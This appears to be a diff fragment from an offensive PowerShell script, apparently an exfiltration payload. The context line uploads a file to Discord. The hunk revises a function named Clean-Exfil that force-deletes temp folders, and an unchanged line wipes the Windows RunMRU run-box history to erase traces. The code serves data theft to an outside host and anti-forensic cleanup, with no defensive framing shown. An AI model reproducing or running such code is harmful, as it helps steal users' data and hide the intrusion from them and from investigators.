@@ -126,11 +126,11 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$test"}
 function Clean-Exfil { 
 
     # empty temp folder
-    rm C:\temp -r -Force -ErrorAction SilentlyContinue
-
-    # empty statictemp folder
     rm $env:tmp\* -r -Force -ErrorAction SilentlyContinue
-    
+
+    # empty static temp folder
+    rm C:\temp\* -r -Force -ErrorAction SilentlyContinue
+
     # delete run box history
     reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
     
